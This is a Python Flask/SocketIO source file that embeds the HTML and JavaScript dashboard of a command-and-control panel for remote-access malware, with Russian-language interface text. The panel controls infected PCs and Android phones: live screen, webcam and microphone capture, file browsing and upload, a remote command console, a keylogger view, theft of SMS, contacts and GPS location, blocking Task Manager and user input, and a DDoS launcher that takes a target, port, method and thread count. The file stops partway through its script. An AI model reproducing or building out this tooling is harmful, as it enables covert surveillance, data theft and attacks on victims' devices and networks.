from flask import Flask, render_template_string
from flask_socketio import SocketIO
import os
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

clients = {}
activity_logs = {} 

HTML = """
<!DOCTYPE html>
<html lang="ru" class="dark">
<head>
    <meta charset="UTF-8">
    <title>C2 Dashboard | Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap');
        body { font-family: 'Inter', sans-serif; background-color: #0b0f19; color: #c9d1d9; }
        .font-mono { font-family: 'JetBrains Mono', monospace; }
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: #0b0f19; }
        ::-webkit-scrollbar-thumb { background: #1f2937; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #374151; }
        .sidebar { background-color: #111827; border-right: 1px solid #1f2937; z-index: 100; position: relative; }
        .sidebar-item { transition: all 0.2s ease; border-left: 3px solid transparent; }
        .sidebar-item:hover { background-color: #1f2937; border-left-color: #3b82f6; }
        .sidebar-item.active { background-color: #1f2937; border-left-color: #3b82f6; color: #fff; }
        .client-row { transition: background-color 0.2s; }
        .client-row:hover { background-color: #1f2937; cursor: pointer; }
        .client-row.selected { background-color: #1e3a8a; border-left: 3px solid #60a5fa; }
        .tab-btn { transition: all 0.2s; border-bottom: 2px solid transparent; }
        .tab-btn.active { border-bottom-color: #3b82f6; color: #60a5fa; }
        .toggle-switch { position: relative; display: inline-block; width: 40px; height: 22px; }
        .toggle-switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #374151; transition: .3s; border-radius: 22px; }
        .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 3px; background-color: white; transition: .3s; border-radius: 50%; }
        input:checked + .slider { background-color: #10b981; }
        input:checked + .slider:before { transform: translateX(18px); }
        input[type=range] { -webkit-appearance: none; width: 100%; background: transparent; }
        input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; height: 16px; width: 16px; border-radius: 50%; background: #60a5fa; cursor: pointer; margin-top: -6px; }
        input[type=range]::-webkit-slider-runnable-track { width: 100%; height: 4px; cursor: pointer; background: #374151; border-radius: 2px; }
        .chat-bubble { max-width: 70%; padding: 8px 12px; border-radius: 12px; margin-bottom: 8px; font-size: 14px; word-wrap: break-word; }
        .chat-admin { background-color: #1d4ed8; color: white; margin-left: auto; border-bottom-right-radius: 2px; }
        .chat-client { background-color: #374151; color: #e5e7eb; margin-right: auto; border-bottom-left-radius: 2px; }
        .fade-in { animation: fadeIn 0.3s ease-in-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
        .dropdown-wrap { position: relative; width: 100%; padding: 10px; border-bottom: 1px solid #1f2937; background: #0d1117; }
        .dropdown-btn { width: 100%; display: flex; justify-content: space-between; align-items: center; background: #1f2937; color: #e5e7eb; padding: 10px 14px; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; border: 1px solid #374151; transition: all 0.2s ease; }
        .dropdown-btn:hover { background: #374151; border-color: #3b82f6; }
        .dropdown-btn .chevron { transition: transform 0.3s ease; }
        .dropdown-wrap.open .dropdown-btn .chevron { transform: rotate(180deg); }
        .dropdown-btn.active-mode { border-color: #3b82f6; box-shadow: 0 0 0 1px #3b82f6; }
        .dropdown-menu { position: absolute; top: calc(100% - 2px); left: 10px; right: 10px; z-index: 50; background: #111827; border: 1px solid #1f2937; border-radius: 8px; overflow: hidden; max-height: 0; opacity: 0; transform: translateY(-6px); transition: max-height 0.35s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.25s ease, transform 0.3s ease; box-shadow: 0 12px 24px rgba(0,0,0,0.5); pointer-events: none; }
        .dropdown-wrap.open .dropdown-menu { max-height: 300px; opacity: 1; transform: translateY(0); pointer-events: auto; }
        .dropdown-section-title { font-size: 10px; text-transform: uppercase; letter-spacing: 0.08em; color: #6b7280; padding: 8px 14px 4px; font-weight: 700; }
        .dropdown-item { display: flex; align-items: center; gap: 10px; padding: 10px 14px; cursor: pointer; font-size: 13px; color: #c9d1d9; transition: background 0.15s, padding-left 0.15s; border-left: 3px solid transparent; }
        .dropdown-item:hover { background: #1f2937; padding-left: 18px; border-left-color: #3b82f6; }
        .dropdown-item.selected { background: #1e3a8a; color: #fff; border-left-color: #60a5fa; }
        .dropdown-divider { height: 1px; background: #1f2937; margin: 4px 0; }
    </style>
</head>
<body class="h-screen overflow-hidden flex">

    <aside class="sidebar w-72 flex flex-col h-full">
        <div class="p-4 border-b border-gray-800 flex items-center gap-3">
            <div class="w-8 h-8 rounded bg-blue-600 flex items-center justify-center text-white font-bold shadow-lg shadow-blue-500/30">C2</div>
            <div>
                <h1 class="text-sm font-bold text-white tracking-wide">DASHBOARD</h1>
                <p class="text-[10px] text-gray-500 font-mono">v6.0.0</p>
            </div>
        </div>

        <div class="dropdown-wrap" id="dropdownWrap">
            <button class="dropdown-btn" id="dropdownBtn" onclick="toggleDropdown(event)">
                <span class="label"><i class="fa-solid fa-list-check"></i> <span id="dropdownLabel">ВЫБРАТЬ</span></span>
                <i class="fa-solid fa-chevron-down chevron text-xs text-gray-400"></i>
            </button>
            <div class="dropdown-menu" id="dropdownMenu" onclick="event.stopPropagation()">
                <div class="dropdown-section-title">PC Clients</div>
                <div class="dropdown-item" data-platform="pc" onclick="pickPlatform('pc', event)"><i class="fa-solid fa-desktop text-blue-400 w-4 text-center"></i><span>Персональные компьютеры</span></div>
                <div class="dropdown-divider"></div>
                <div class="dropdown-section-title">Phone Clients</div>
                <div class="dropdown-item" data-platform="phone" onclick="pickPlatform('phone', event)"><i class="fa-solid fa-mobile-screen text-green-400 w-4 text-center"></i><span>Телефоны (Android)</span></div>
            </div>
        </div>

        <div class="flex-1 overflow-y-auto p-2">
            <div class="text-xs font-semibold text-gray-500 mb-2 px-2 uppercase tracking-wider">Connected Clients</div>
            <div id="client-list" class="space-y-1"></div>
        </div>

        <div id="main-menu" class="hidden border-t border-gray-800 p-2 space-y-1">
            <div class="text-xs font-semibold text-gray-500 mb-2 px-2 uppercase tracking-wider mt-2">Actions</div>
            
            <div id="pc-menu" class="space-y-1 hidden">
                <div onclick="switchView('control')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-gamepad w-4 text-center"></i> Control</div>
                <div onclick="switchView('system')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-sliders w-4 text-center"></i> System</div>
                <div onclick="switchView('network')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-network-wired w-4 text-center"></i> DDoS</div>
                <div onclick="switchView('chat')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-comments w-4 text-center"></i> Chat</div>
            </div>

            <div id="phone-menu" class="space-y-1 hidden">
                <div onclick="switchView('phone-info')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-mobile-button w-4 text-center"></i> Info</div>
                <div onclick="switchView('phone-sms')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-sms w-4 text-center"></i> SMS</div>
                <div onclick="switchView('phone-contacts')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-address-book w-4 text-center"></i> Contacts</div>
                <div onclick="switchView('phone-gps')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-location-dot w-4 text-center"></i> GPS</div>
                <div onclick="switchView('phone-cam')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-camera w-4 text-center"></i> Camera</div>
                <div onclick="switchView('phone-screen')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-tv w-4 text-center"></i> Screen</div>
                <div onclick="switchView('phone-mic')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-microphone w-4 text-center"></i> Mic</div>
            </div>

            <div class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400" onclick="switchView('keylog')"><i class="fa-solid fa-keyboard w-4 text-center"></i> Spy Logs</div>
        </div>
    </aside>

    <main class="flex-1 flex flex-col h-full bg-[#0b0f19] relative z-10">
        <header class="h-14 border-b border-gray-800 flex items-center justify-between px-6 bg-[#111827]">
            <div class="flex items-center gap-4">
                <h2 id="active-client-name" class="text-sm font-semibold text-gray-300">Выберите клиента</h2>
                <span id="active-client-ip" class="text-xs font-mono text-blue-400"></span>
                <span id="active-client-uptime" class="text-xs font-mono text-gray-500"></span>
            </div>
            <div class="flex items-center gap-2 text-xs font-mono text-gray-400">
                <div class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div> SYSTEM ONLINE
            </div>
        </header>

        <div id="view-empty" class="flex-1 flex flex-col items-center justify-center text-gray-600">
            <i class="fa-solid fa-terminal text-6xl mb-4 opacity-20"></i>
            <p class="text-sm font-mono">NO CLIENT SELECTED</p>
        </div>

        <!-- PC CONTROL -->
        <div id="view-control" class="hidden flex-1 flex flex-col overflow-hidden fade-in">
            <div class="flex border-b border-gray-800 bg-[#111827] text-xs font-semibold text-gray-400">
                <div onclick="switchTab('desktop', event)" class="tab-btn active px-6 py-3 flex items-center gap-2"><i class="fa-solid fa-desktop"></i> Desktop</div>
                <div onclick="switchTab('webcam', event)" class="tab-btn px-6 py-3 flex items-center gap-2"><i class="fa-solid fa-camera"></i> Webcam</div>
                <div onclick="switchTab('mic', event)" class="tab-btn px-6 py-3 flex items-center gap-2"><i class="fa-solid fa-microphone"></i> Mic</div>
                <div onclick="switchTab('explorer', event)" class="tab-btn px-6 py-3 flex items-center gap-2"><i class="fa-solid fa-folder"></i> Files</div>
                <div onclick="switchTab('console', event)" class="tab-btn px-6 py-3 flex items-center gap-2"><i class="fa-solid fa-terminal"></i> CMD</div>
                <div onclick="switchTab('processes', event)" class="tab-btn px-6 py-3 flex items-center gap-2"><i class="fa-solid fa-list"></i> Procs</div>
            </div>
            <div class="flex-1 overflow-y-auto p-6 relative">
                <div id="tab-desktop" class="tab-content block">
                    <div class="flex items-center gap-4 mb-4">
                        <div class="flex items-center gap-3 bg-[#111827] px-4 py-2 rounded border border-gray-800">
                            <span class="text-xs text-gray-400">Screen</span>
                            <label class="toggle-switch"><input type="checkbox" id="toggle-screen" onchange="toggleFeature('screen', this.checked)"><span class="slider"></span></label>
                        </div>
                        <div class="flex items-center gap-3 bg-[#111827] px-4 py-2 rounded border border-gray-800">
                            <span class="text-xs text-gray-400">Mouse</span>
                            <label class="toggle-switch"><input type="checkbox" id="toggle-mouse" checked><span class="slider"></span></label>
                        </div>
                        <div class="flex items-center gap-3 bg-[#111827] px-4 py-2 rounded border border-gray-800">
                            <span class="text-xs text-gray-400">Keyboard</span>
                            <label class="toggle-switch"><input type="checkbox" id="toggle-keyboard" checked><span class="slider"></span></label>
                        </div>
                    </div>
                    <div class="border border-gray-800 rounded-lg overflow-hidden bg-black h-[500px] flex items-center justify-center">
                        <img id="screen" src="" onmousedown="mouseDown(event)" onmousemove="mouseMove(event)" class="max-h-full max-w-full object-contain cursor-crosshair" style="display:none;">
                        <span id="screen-placeholder" class="text-gray-700 font-mono text-sm">STREAM OFFLINE</span>
                    </div>
                </div>

                <div id="tab-webcam" class="tab-content hidden">
                    <div class="flex items-center gap-4 mb-4">
                        <div class="flex items-center gap-3 bg-[#111827] px-4 py-2 rounded border border-gray-800">
                            <span class="text-xs text-gray-400">Webcam</span>
                            <label class="toggle-switch"><input type="checkbox" id="toggle-webcam" onchange="toggleFeature('webcam', this.checked)"><span class="slider"></span></label>
                        </div>
                    </div>
                    <div class="border border-gray-800 rounded-lg overflow-hidden bg-black h-[500px] flex items-center justify-center">
                        <img id="webcam" src="" class="max-h-full max-w-full object-contain" style="display:none;">
                        <span id="webcam-placeholder" class="text-gray-700 font-mono text-sm">CAMERA OFFLINE</span>
                    </div>
                </div>

                <div id="tab-mic" class="tab-content hidden">
                    <div class="flex items-center gap-4 mb-4">
                        <div class="flex items-center gap-3 bg-[#111827] px-4 py-2 rounded border border-gray-800">
                            <span class="text-xs text-gray-400">Microphone</span>
                            <label class="toggle-switch"><input type="checkbox" id="toggle-mic" onchange="toggleFeature('mic', this.checked)"><span class="slider"></span></label>
                        </div>
                    </div>
                    <div class="border border-gray-800 rounded-lg bg-black h-[300px] flex flex-col items-center justify-center text-gray-600">
                        <i class="fa-solid fa-headphones text-6xl mb-4 text-blue-500/50"></i>
                        <p class="font-mono text-sm">AUDIO STREAM ACTIVE</p>
                    </div>
                </div>

                <div id="tab-explorer" class="tab-content hidden h-full flex flex-col">
                    <div class="flex items-center justify-between mb-4 bg-[#111827] p-2 rounded border border-gray-800">
                        <div class="flex items-center gap-2">
                            <button onclick="goBack()" class="text-gray-400 hover:text-white px-2 py-1"><i class="fa-solid fa-arrow-left"></i></button>
                            <button onclick="goForward()" class="text-gray-400 hover:text-white px-2 py-1"><i class="fa-solid fa-arrow-right"></i></button>
                            <span id="current-path" class="font-mono text-blue-400 text-xs ml-2">C:/</span>
                        </div>
                        <div class="flex gap-2">
                            <button onclick="requestDir('C:/')" class="bg-gray-800 hover:bg-gray-700 text-white px-3 py-1 rounded text-xs transition-colors"><i class="fa-solid fa-hdd"></i> C:</button>
                            <button onclick="document.getElementById('file-upload').click()" class="bg-blue-600 hover:bg-blue-500 text-white px-3 py-1 rounded text-xs transition-colors"><i class="fa-solid fa-upload"></i> Upload</button>
                            <input type="file" id="file-upload" class="hidden" onchange="uploadFile(this)">
                        </div>
                    </div>
                    <div id="file-list" class="flex-1 border border-gray-800 rounded bg-[#0b0f19] overflow-y-auto p-2"></div>
                </div>

                <div id="tab-console" class="tab-content hidden h-full flex flex-col">
                    <div id="console-output" class="flex-1 bg-black text-green-500 font-mono text-xs p-4 overflow-y-auto border border-gray-800 rounded mb-2"></div>
                    <div class="flex gap-2">
                        <input type="text" id="console-input" class="flex-1 bg-[#111827] border border-gray-800 text-white p-2 rounded focus:outline-none focus:border-blue-500 font-mono text-sm" placeholder="C:\\>" onkeydown="if(event.key === 'Enter') sendCommand()">
                        <button onclick="sendCommand()" class="bg-blue-600 hover:bg-blue-500 text-white px-6 py-2 rounded font-bold text-sm transition-colors">SEND</button>
                    </div>
                </div>

                <div id="tab-processes" class="tab-content hidden h-full flex flex-col">
                    <button onclick="getProcesses()" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded mb-4 w-full font-bold text-sm transition-colors"><i class="fa-solid fa-sync"></i> Обновить список</button>
                    <div id="process-list" class="flex-1 border border-gray-800 bg-[#0b0f19] overflow-y-auto p-2 font-mono text-xs"></div>
                </div>
            </div>
        </div>

        <!-- PC SYSTEM -->
        <div id="view-system" class="hidden flex-1 p-6 overflow-y-auto fade-in">
            <h2 class="text-lg font-bold text-white mb-6">System Management</h2>
            <div class="grid grid-cols-2 gap-4 max-w-4xl">
                <button onclick="systemCmd('shutdown')" class="bg-red-900/30 hover:bg-red-900/50 border border-red-900/50 text-red-400 font-bold py-4 rounded-lg flex items-center justify-center gap-3"><i class="fa-solid fa-power-off"></i> Выключить ПК</button>
                <button onclick="systemCmd('restart')" class="bg-orange-900/30 hover:bg-orange-900/50 border border-orange-900/50 text-orange-400 font-bold py-4 rounded-lg flex items-center justify-center gap-3"><i class="fa-solid fa-rotate-right"></i> Перезагрузить ПК</button>
                <button onclick="systemCmd('logoff')" class="bg-yellow-900/30 hover:bg-yellow-900/50 border border-yellow-900/50 text-yellow-400 font-bold py-4 rounded-lg flex items-center justify-center gap-3"><i class="fa-solid fa-right-from-bracket"></i> Выйти из аккаунта</button>
                <button onclick="systemCmd('monitor_off')" class="bg-gray-800 hover:bg-gray-700 border border-gray-700 text-gray-300 font-bold py-4 rounded-lg flex items-center justify-center gap-3"><i class="fa-solid fa-tv"></i> Выключить монитор</button>
                <button onclick="systemCmd('hide_taskbar')" class="bg-gray-800 hover:bg-gray-700 border border-gray-700 text-gray-300 font-bold py-4 rounded-lg flex items-center justify-center gap-3"><i class="fa-solid fa-window-maximize"></i> Скрыть панель задач</button>
                <button onclick="systemCmd('show_taskbar')" class="bg-gray-800 hover:bg-gray-700 border border-gray-700 text-gray-300 font-bold py-4 rounded-lg flex items-center justify-center gap-3"><i class="fa-solid fa-window-restore"></i> Показать панель задач</button>
            </div>

            <hr class="border-gray-800 my-8 max-w-4xl">

            <h2 class="text-lg font-bold text-white mb-6">Volume Control</h2>
            <div class="max-w-4xl bg-[#111827] border border-gray-800 rounded-lg p-6 flex items-center gap-6">
                <div class="flex items-center gap-3">
                    <button onclick="toggleMute()" id="vol-icon" class="text-2xl text-gray-300 hover:text-white transition-colors"><i class="fa-solid fa-volume-high"></i></button>
                    <label class="toggle-switch" title="Заблокировать на 100%"><input type="checkbox" id="toggle-vol-lock" onchange="toggleVolLock(this.checked)"><span class="slider"></span></label>
                    <i class="fa-solid fa-lock text-xs text-gray-500" id="lock-icon"></i>
                </div>
                <div class="flex-1 flex items-center gap-4">
                    <input type="range" id="vol-slider" min="0" max="100" value="50" onchange="setVolume(this.value)">
                    <span id="vol-value" class="font-mono text-blue-400 w-10 text-right">50%</span>
                </div>
            </div>

            <hr class="border-gray-800 my-8 max-w-4xl">

            <h2 class="text-lg font-bold text-white mb-6">Troll Commands</h2>
            <div class="max-w-4xl bg-[#111827] border border-gray-800 rounded-lg p-6 space-y-6">
                <div class="flex flex-col gap-2">
                    <label class="text-xs font-bold text-gray-400 uppercase">Fake Error Message</label>
                    <div class="flex gap-2">
                        <input type="text" id="troll-title" class="w-1/3 bg-[#0b0f19] border border-gray-700 text-white p-2 rounded text-sm" placeholder="Заголовок">
                        <input type="text" id="troll-text" class="flex-1 bg-[#0b0f19] border border-gray-700 text-white p-2 rounded text-sm" placeholder="Текст ошибки...">
                        <button onclick="sendTroll('msgbox')" class="bg-red-600 hover:bg-red-500 text-white px-6 py-2 rounded font-bold text-sm">Показать</button>
                    </div>
                </div>
                <div class="flex flex-col gap-2">
                    <label class="text-xs font-bold text-gray-400 uppercase">Open URL</label>
                    <div class="flex gap-2">
                        <input type="text" id="troll-url" class="flex-1 bg-[#0b0f19] border border-gray-700 text-white p-2 rounded text-sm" placeholder="https://...">
                        <button onclick="sendTroll('openurl')" class="bg-blue-600 hover:bg-blue-500 text-white px-6 py-2 rounded font-bold text-sm">Открыть</button>
                    </div>
                </div>
                <div class="flex gap-4">
                    <button onclick="sendTroll('flip_mouse')" class="flex-1 bg-purple-900/30 hover:bg-purple-900/50 border border-purple-900/50 text-purple-400 font-bold py-3 rounded flex items-center justify-center gap-2"><i class="fa-solid fa-arrows-left-right"></i> Перевернуть мышь</button>
                    <button onclick="sendTroll('block_input')" class="flex-1 bg-pink-900/30 hover:bg-pink-900/50 border border-pink-900/50 text-pink-400 font-bold py-3 rounded flex items-center justify-center gap-2"><i class="fa-solid fa-keyboard"></i> Блок ввода (5 сек)</button>
                    <button onclick="systemCmd('disable_taskmgr')" class="flex-1 bg-red-900/30 hover:bg-red-900/50 border border-red-900/50 text-red-400 font-bold py-3 rounded flex items-center justify-center gap-2"><i class="fa-solid fa-ban"></i> Заблокировать Диспетчер</button>
                </div>
            </div>
        </div>

        <!-- PC NETWORK (DDoS) -->
        <div id="view-network" class="hidden flex-1 p-6 overflow-y-auto fade-in">
            <h2 class="text-lg font-bold text-white mb-6">DDoS Attack</h2>
            <div class="max-w-4xl bg-[#111827] border border-gray-800 rounded-lg p-6 space-y-4">
                <div class="grid grid-cols-2 gap-4">
                    <div class="flex flex-col gap-2"><label class="text-xs font-bold text-gray-400 uppercase">Target IP / Domain</label><input type="text" id="ddos-ip" class="bg-[#0b0f19] border border-gray-700 text-white p-2 rounded text-sm" placeholder="1.1.1.1"></div>
                    <div class="flex flex-col gap-2"><label class="text-xs font-bold text-gray-400 uppercase">Port</label><input type="number" id="ddos-port" class="bg-[#0b0f19] border border-gray-700 text-white p-2 rounded text-sm" placeholder="80"></div>
                </div>
                <div class="grid grid-cols-2 gap-4">
                    <div class="flex flex-col gap-2"><label class="text-xs font-bold text-gray-400 uppercase">Method</label><select id="ddos-method" class="bg-[#0b0f19] border border-gray-700 text-white p-2 rounded text-sm"><option value="TCP">TCP</option><option value="UDP">UDP</option><option value="HTTP">HTTP</option></select></div>
                    <div class="flex flex-col gap-2"><label class="text-xs font-bold text-gray-400 uppercase">Threads</label><input type="number" id="ddos-threads" class="bg-[#0b0f19] border border-gray-700 text-white p-2 rounded text-sm" value="50"></div>
                </div>
                <div class="flex gap-4 pt-4">
                    <button onclick="startDdos()" class="flex-1 bg-red-600 hover:bg-red-500 text-white font-bold py-4 rounded flex items-center justify-center gap-2"><i class="fa-solid fa-crosshairs"></i> Запустить</button>
                    <button onclick="stopDdos()" class="flex-1 bg-gray-700 hover:bg-gray-600 text-white font-bold py-4 rounded flex items-center justify-center gap-2"><i class="fa-solid fa-stop"></i> Стоп</button>
                </div>
                <div id="ddos-status" class="text-center text-gray-500 mt-4">Ожидание...</div>
            </div>
        </div>

        <!-- CHAT -->
        <div id="view-chat" class="hidden flex-1 flex flex-col overflow-hidden fade-in p-6">
            <div class="flex justify-between items-center mb-4 max-w-4xl">
                <h2 class="text-lg font-bold text-white">Live Chat</h2>
                <div class="flex items-center gap-3 bg-[#111827] px-4 py-2 rounded border border-gray-800">
                    <span class="text-xs text-gray-400">Chat Window</span>
                    <label class="toggle-switch">
                        <input type="checkbox" id="toggle-chat" onchange="toggleFeature('chat', this.checked)">
                        <span class="slider"></span>
                    </label>
                </div>
            </div>
            <div class="flex-1 bg-[#111827] border border-gray-800 rounded-lg flex flex-col overflow-hidden max-w-4xl">
                <div id="chat-messages" class="flex-1 p-4 overflow-y-auto flex flex-col"></div>
                <div class="p-2 border-t border-gray-800 flex gap-2">
                    <input type="text" id="chat-input" class="flex-1 bg-[#0b0f19] border border-gray-700 text-white p-2 rounded focus:outline-none focus:border-blue-500 text-sm" placeholder="Написать сообщение..." onkeydown="if(event.key === 'Enter') sendChatMsg()">
                    <button onclick="sendChatMsg()" class="bg-blue-600 hover:bg-blue-500 text-white px-6 py-2 rounded font-bold transition-colors">Send</button>
                </div>
            </div>
        </div>

        <!-- PHONE VIEWS -->
        <div id="view-phone-info" class="hidden flex-1 p-6 overflow-y-auto fade-in">
            <h2 class="text-lg font-bold text-white mb-6">Phone Info</h2>
            <div class="max-w-4xl bg-[#111827] border border-gray-800 rounded-lg p-6 font-mono text-sm space-y-2" id="phone-info-data"></div>
        </div>
        <div id="view-phone-sms" class="hidden flex-1 flex flex-col overflow-hidden fade-in p-6">
            <div class="flex justify-between items-center mb-4 max-w-4xl">
                <h2 class="text-lg font-bold text-white">SMS Messages</h2>
                <button onclick="dumpData('sms')" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded text-sm"><i class="fa-solid fa-download"></i> Запросить SMS</button>
            </div>
            <div id="sms-list" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-sm whitespace-pre-wrap text-gray-300"></div>
        </div>
        <div id="view-phone-contacts" class="hidden flex-1 flex flex-col overflow-hidden fade-in p-6">
            <div class="flex justify-between items-center mb-4 max-w-4xl">
                <h2 class="text-lg font-bold text-white">Contacts</h2>
                <button onclick="dumpData('contacts')" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded text-sm"><i class="fa-solid fa-download"></i> Запросить Контакты</button>
            </div>
            <div id="contacts-list" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-sm whitespace-pre-wrap text-gray-300"></div>
        </div>
        <div id="view-phone-gps" class="hidden flex-1 p-6 overflow-y-auto fade-in flex-col">
            <div class="flex justify-between items-center mb-4 max-w-4xl">
                <h2 class="text-lg font-bold text-white">GPS Location</h2>
                <button onclick="dumpData('geo')" class="bg-green-600 hover:bg-green-500 text-white px-4 py-2 rounded text-sm"><i class="fa-solid fa-location-crosshairs"></i> Обновить Гео</button>
            </div>
            <div id="gps-data" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-6 flex flex-col items-center justify-center text-gray-400 font-mono">Ожидание...</div>
        </div>
        
        <div id="view-phone-cam" class="hidden flex-1 p-6 overflow-y-auto fade-in">
            <div class="flex items-center justify-between mb-4">
                <h2 class="text-lg font-bold text-white">Camera</h2>
                <div class="flex items-center gap-3 bg-[#111827] px-4 py-2 rounded border border-gray-800">
                    <span class="text-xs text-gray-400">Включить камеру</span>
                    <label class="toggle-switch"><input type="checkbox" onchange="toggleFeature('camera', this.checked)"><span class="slider"></span></label>
                </div>
            </div>
            <div class="border border-gray-800 rounded-lg bg-black h-[500px] flex items-center justify-center relative">
                <img id="cam-img" src="" class="max-h-full max-w-full object-contain hidden">
                <span id="cam-placeholder" class="text-gray-700 font-mono text-sm">STREAM OFFLINE</span>
            </div>
        </div>
        
        <div id="view-phone-screen" class="hidden flex-1 p-6 overflow-y-auto fade-in">
            <div class="flex items-center justify-between mb-4">
                <h2 class="text-lg font-bold text-white">Screen Mirror</h2>
                <div class="flex items-center gap-3 bg-[#111827] px-4 py-2 rounded border border-gray-800">
                    <span class="text-xs text-gray-400">Включить экран</span>
                    <label class="toggle-switch"><input type="checkbox" onchange="toggleFeature('screen', this.checked)"><span class="slider"></span></label>
                </div>
            </div>
            <div class="border border-gray-800 rounded-lg bg-black h-[500px] flex items-center justify-center relative">
                <img id="scr-img" src="" class="max-h-full max-w-full object-contain hidden">
                <span id="scr-placeholder" class="text-gray-700 font-mono text-sm">STREAM OFFLINE</span>
            </div>
        </div>
        
        <div id="view-phone-mic" class="hidden flex-1 p-6 overflow-y-auto fade-in">
            <div class="flex items-center justify-between mb-4">
                <h2 class="text-lg font-bold text-white">Microphone</h2>
                <div class="flex items-center gap-3 bg-[#111827] px-4 py-2 rounded border border-gray-800">
                    <span class="text-xs text-gray-400">Слушать</span>
                    <label class="toggle-switch"><input type="checkbox" onchange="toggleFeature('mic', this.checked)"><span class="slider"></span></label>
                </div>
            </div>
            <div class="border border-gray-800 rounded-lg bg-black h-[300px] flex flex-col items-center justify-center text-gray-600">
                <i class="fa-solid fa-headphones text-6xl mb-4 text-green-500/50"></i>
                <p class="font-mono text-sm">AUDIO STREAM ACTIVE</p>
            </div>
        </div>

        <!-- SPY LOGS -->
        <div id="view-keylog" class="hidden flex-1 flex flex-col overflow-hidden fade-in p-6 space-y-4">
            <div class="flex-1 flex flex-col min-h-0">
                <div class="flex justify-between items-center mb-2 max-w-4xl">
                    <h2 class="text-sm font-bold text-white"><i class="fa-solid fa-keyboard text-blue-400 mr-2"></i>Keylogger</h2>
                    <button onclick="document.getElementById('keylog-output').innerText=''" class="bg-red-900/50 hover:bg-red-800 text-red-400 px-3 py-1 rounded text-xs">Очистить</button>
                </div>
                <div id="keylog-output" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-sm text-green-500 whitespace-pre-wrap break-all min-h-[150px]"></div>
            </div>
            <div class="flex-1 flex flex-col min-h-0">
                <div class="flex justify-between items-center mb-2 max-w-4xl">
                    <h2 class="text-sm font-bold text-white"><i class="fa-solid fa-history text-purple-400 mr-2"></i>Activity Log (Online / Offline)</h2>
                    <button onclick="document.getElementById('activity-log-output').innerText=''" class="bg-red-900/50 hover:bg-red-800 text-red-400 px-3 py-1 rounded text-xs">Очистить</button>
                </div>
                <div id="activity-log-output" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-sm text-blue-300 whitespace-pre-wrap min-h-[150px]"></div>
            </div>
        </div>

    </main>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        const socket = io();
        let currentClientId = null;
        let currentPlatform = null;
        let downloadChunks = {};
        let volLocked = false;
        let lastClientsData = {};

        setInterval(() => {
            if (currentClientId && lastClientsData[currentClientId]) {
                const c = lastClientsData[currentClientId];
                const up = Math.floor(Date.now() / 1000 - c.connected_at);
                document.getElementById('active-client-uptime').innerText = `В сети: ${formatUptime(up)}`;
            }
            for (let id in lastClientsData) {
                const el = document.getElementById(`client-${id}`);
                if (el) {
                    const c = lastClientsData[id];
                    const dot = el.querySelector('.status-dot');
                    if (dot) dot.className = `status-dot w-2 h-2 rounded-full ${c.screen_on ? 'bg-green-500 shadow-[0_0_5px_#10b981]' : 'bg-red-500 shadow-[0_0_5px_#ef4444]'}`;
                }
            }
        }, 1000);

        function formatUptime(seconds) {
            if (seconds < 60) return `${seconds} сек`;
            const m = Math.floor(seconds / 60);
            if (m < 60) return `${m} мин`;
            const h = Math.floor(m / 60);
            return `${h} ч ${m % 60} мин`;
        }

        function toggleDropdown(e) { e.stopPropagation(); document.getElementById('dropdownWrap').classList.toggle('open'); }
        function pickPlatform(platform, e) {
            e.stopPropagation();
            document.getElementById('dropdownWrap').classList.remove('open');
            document.querySelectorAll('.dropdown-item').forEach(el => el.classList.remove('selected'));
            document.querySelector(`.dropdown-item[data-platform="${platform}"]`).classList.add('selected');
            document.getElementById('dropdownBtn').classList.add('active-mode');
